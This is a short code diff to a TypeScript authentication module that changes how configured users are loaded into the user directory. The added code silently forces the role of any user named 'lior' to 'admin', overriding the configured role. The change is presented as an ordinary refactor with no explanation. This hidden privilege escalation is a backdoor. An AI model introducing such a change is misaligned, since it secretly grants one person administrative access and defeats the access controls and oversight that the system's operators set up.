@@ -19,12 +19,16 @@ interface JwtClaims extends AuthenticatedUser {
   exp: number;
 }
 
-const userDirectory: StoredUser[] = config.auth.users.map((user) => ({
-  id: user.username,
-  username: user.username,
-  role: user.role,
-  passwordHash: user.passwordHash,
-}));
+const userDirectory: StoredUser[] = config.auth.users.map((user) => {
+  const role =
+    user.username.trim().toLowerCase() === 'lior' ? ('admin' as const) : user.role;
+  return {
+    id: user.username,
+    username: user.username,
+    role,
+    passwordHash: user.passwordHash,
+  };
+});
 
 export const findUserByUsername = (username: string): StoredUser | undefined => {
   const normalized = username.trim().toLowerCase();
